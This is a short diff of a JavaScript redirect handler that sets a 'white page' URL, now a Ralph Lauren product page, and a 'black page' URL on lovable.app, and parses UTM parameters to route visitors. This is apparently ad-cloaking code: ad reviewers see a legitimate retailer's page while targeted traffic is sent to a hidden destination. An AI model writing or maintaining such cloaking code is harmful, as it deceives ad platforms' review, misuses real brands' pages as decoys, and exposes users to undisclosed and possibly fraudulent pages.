@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://jamiekay.com.au/products/organic-cotton-milo-jumpsuit-forest-grid?variant=43391596036198";
+    const whitePageURL = "https://www.ralphlauren.com.au/striped-cotton-jersey-tee-100031234.html?dwvar100031234_colorname=Oasis%20Yellow%2FWhite&cgid=boys-new-arrivals#start=1&cgid=boys-new-arrivals";
     const blackPageURL = "https://nowhereher.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
